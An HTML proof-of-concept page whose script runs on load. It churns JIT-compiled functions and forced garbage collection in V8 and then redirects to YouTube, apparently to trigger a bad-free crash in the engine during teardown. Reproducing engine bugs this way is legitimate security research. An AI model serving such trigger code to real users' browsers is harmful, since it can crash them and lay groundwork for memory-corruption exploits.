<!DOCTYPE html>
<html>
<head>
  <title>V8 Bad-Free Trigger → YouTube</title>
</head>
<body>
<script>
// Optimized for speed: no unnecessary delays, max JIT churn

function makeJitFunction(seed) {
  const body = `
    let a = ${seed};
    for (let i = 0; i < 2000; i++) a = (a * 1664525 + 1013904223) | 0;
    return a;
  `;
  return new Function(body);
}

function triggerStress() {
  const funcs = [];
  const N = 8000; // Push harder

  // Phase 1: Rapid JIT allocation
  for (let i = 0; i < N; i++) {
    const f = makeJitFunction(i);
    f(); // Force compilation
    funcs[i] = f;
  }

  // Phase 2: Aggressive nulling (make collectible)
  for (let i = 0; i < N; i += 1) {
    funcs[i] = null;
  }

  // Force GC if available (no await — sync burst)
  if (typeof gc === 'function') {
    for (let i = 0; i < 15; i++) gc();
  }

  // Phase 3: Re-allocate under pressure
  const funcs2 = [];
  for (let i = 0; i < N; i++) {
    const f = makeJitFunction(i + N);
    f();
    funcs2[i] = f;
  }
  funcs2.length = 0;

  if (typeof gc === 'function') {
    for (let i = 0; i < 10; i++) gc();
  }
}

// Run stress immediately and repeatedly — no async delays
for (let round = 0; round < 8; round++) {
  triggerStress();
}

// After max stress, navigate to YouTube to trigger full teardown
// This may cause V8 to sweep JIT pages during context destruction
setTimeout(() => {
  location.href = "https://www.youtube.com";
}, 0);
</script>
</body>
</html>
